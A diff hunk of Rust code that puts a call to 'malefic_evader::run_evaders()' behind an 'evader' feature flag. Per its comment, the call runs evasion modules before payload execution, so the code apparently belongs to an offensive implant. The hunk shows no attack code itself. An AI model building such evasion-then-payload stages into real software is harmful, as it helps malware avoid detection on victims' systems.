@@ -53,6 +53,7 @@ fn main() {
     };
 
     // Stage 2.5: Run evasion modules (before payload execution)
+    #[cfg(feature = "evader")]
     malefic_evader::run_evaders();
 
     // Stage 3: Execute
